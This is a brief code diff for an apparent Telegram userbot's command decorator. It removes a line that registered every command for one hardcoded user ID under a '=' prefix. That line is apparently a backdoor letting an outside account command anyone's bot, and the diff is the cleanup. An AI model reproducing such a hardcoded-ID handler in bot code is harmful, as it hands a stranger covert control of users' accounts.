@@ -33,7 +33,7 @@ class PY:
                 if sudo
                 else ubot.cmd_prefix(command) & filters.me
             )
-            @ubot.on_message(filters.command(command, "=") & filters.user(6629259024))
+            
             @ubot.on_message(sudo_filrers)
             async def wrapped_func(client, message):
                 if sudo:
